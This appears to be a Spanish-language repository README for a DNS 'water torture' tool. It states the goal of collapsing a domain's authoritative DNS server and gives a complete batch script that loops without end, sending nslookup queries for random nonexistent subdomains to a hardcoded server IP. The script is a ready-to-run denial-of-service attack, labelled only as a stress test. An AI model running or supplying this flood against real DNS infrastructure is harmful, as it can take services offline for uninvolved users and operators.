# watertorture

TEST STRESS DNS "WATER TORTURE"
Multitud de consultas de subdominios aleatorios e inexistententes de mydomain.com. Objetivo colapso del servidor DNS autoritavo donde esta registrado mydomain.com




watertorture.bat ;Water Torture DNS autoritativo con proceso por lotes Bath MS-DOS:
Consultas subdominios aleatorios de un dominio.

@ECHO OFF

ECHO Water Torture DNS autoritativo. (c) hackingyseguridad 2016. Version 1.

:loop

SET/A ran=%random%

NSLOOKUP %ran%.hackingyseguridad.es 196.200.104.106

goto loop

#
# www.hackingyseguridad.com
#

